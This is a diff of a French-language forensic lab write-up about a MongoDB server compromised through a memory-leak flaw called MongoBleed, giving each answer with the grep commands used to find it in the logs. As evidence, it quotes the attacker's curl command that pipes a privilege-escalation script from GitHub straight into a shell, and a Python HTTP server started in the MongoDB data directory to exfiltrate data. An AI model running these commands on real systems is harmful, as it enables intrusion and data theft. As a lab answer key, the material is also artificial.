@@ -2,9 +2,9 @@
 
 ## Scenario
 
-Incident prioritaire impliquant un serveur compromis. 
-L'hôte `mongodbsync` est un serveur MongoDB secondaire. 
-L'administrateur a mentionné une vulnérabilité appelée **MongoBleed**. 
+Incident prioritaire impliquant un serveur compromis.
+L'hôte `mongodbsync` est un serveur MongoDB secondaire.
+L'administrateur a mentionné une vulnérabilité appelée **MongoBleed**.
 Une acquisition triage a été collectée avec UAC pour l'analyse forensique.
 
 ## Artefacts Clés
@@ -29,14 +29,16 @@ MongoBleed est une vulnérabilité de divulgation mémoire dans MongoDB permetta
 
 **Réponse : `8.0.16`**
 
-Trouvée dans les logs MongoDB au démarrage :
-```json
-{"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16"...}}}
+```bash
+# Dans les logs MongoDB
+grep -i "version" mongod.log | head -5
+
+# Ou dans auth.log (commande d'installation)
+grep "mongodb-org" auth.log
 ```
 
-Confirmée aussi dans `auth.log` :
-```
-COMMAND=/usr/bin/apt install -y mongodb-org=8.0.16
+```json
+{"msg":"Build Info","attr":{"buildInfo":{"version":"8.0.16"...}}}
 ```
 
 ---
@@ -45,9 +47,12 @@ COMMAND=/usr/bin/apt install -y mongodb-org=8.0.16
 
 **Réponse : `65.0.76.43`**
 
-L'attaquant s'est connecté à MongoDB depuis cette IP, visible dans mongod.log :
-```json
-{"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340"...}}
+```bash
+# Chercher les connexions acceptées depuis des IPs externes
+grep "Connection accepted" mongod.log | head -20
+
+# Ou chercher les IPs uniques
+grep -oP '"remote":"\K[0-9.]+' mongod.log | sort -u
 ```
 
 ---
@@ -56,7 +61,11 @@ L'attaquant s'est connecté à MongoDB depuis cette IP, visible dans mongod.log 
 
 **Réponse : `2025-12-29 05:25:52`**
 
-Première connexion malveillante dans les logs MongoDB :
+```bash
+# Première connexion de l'attaquant
+grep "Connection accepted.*65.0.76.43" mongod.log | head -1
+```
+
 ```json
 {"t":{"$date":"2025-12-29T05:25:52.743+00:00"},"msg":"Connection accepted","attr":{"remote":"65.0.76.43:35340"}}
 ```
@@ -67,8 +76,8 @@ Première connexion malveillante dans les logs MongoDB :
 
 **Réponse : `37630`**
 
-Compté avec :
 ```bash
+# Compter les connexions de l'attaquant
 grep -c "Connection accepted.*65.0.76.43" mongod.log
 ```
 
@@ -80,13 +89,20 @@ Les connexions ont eu lieu entre `05:25:52` et `05:27:07` (~75 secondes), soit ~
 
 **Réponse : `2025-12-29 05:40:03`**
 
-Après une attaque brute-force contre `mongoadmin` (utilisant probablement les credentials fuités via MongoBleed), l'attaquant s'est connecté via SSH :
+```bash
+# Chercher les connexions SSH réussies depuis l'IP de l'attaquant
+grep "Accepted.*65.0.76.43" auth.log
+```
 
 ```
 2025-12-29T05:40:03 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
 ```
 
-Le brute-force a commencé à `05:39:18` avec de nombreuses tentatives échouées visibles dans `auth.log`.
+Le brute-force a commencé à `05:39:18` :
+```bash
+# Voir les tentatives échouées
+grep "authentication failure.*65.0.76.43" auth.log | head -10
+```
 
 ---
 
@@ -94,12 +110,12 @@ Le brute-force a commencé à `05:39:18` avec de nombreuses tentatives échouée
 
 **Réponse : `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`**
 
-Trouvée dans `/home/mongoadmin/.bash_history` :
 ```bash
-curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# Lire l'historique bash de l'attaquant
+cat /home/mongoadmin/.bash_history
 ```
 
-L'attaquant a utilisé linpeas.sh (Linux Privilege Escalation Awesome Script) pipé directement vers le shell pour éviter d'écrire sur le disque.
+L'attaquant a utilisé linpeas.sh pipé directement vers le shell pour éviter d'écrire sur le disque.
 
 ---
 
@@ -107,14 +123,15 @@ L'attaquant a utilisé linpeas.sh (Linux Privilege Escalation Awesome Script) pi
 
 **Réponse : `/var/lib/mongodb`**
 
-Depuis `.bash_history` :
 ```bash
-cd /var/lib/mongodb/
-ls -la
-python3 -m http.server 6969
+# Dans le bash_history, chercher les commandes cd et http.server
+cat /home/mongoadmin/.bash_history | grep -E "cd|http"
 ```
 
-L'attaquant a accédé au répertoire de données MongoDB et lancé un serveur HTTP Python sur le port 6969 pour l'exfiltration.
+```bash
+cd /var/lib/mongodb/
+python3 -m http.server 6969
+```
 
 ---
 
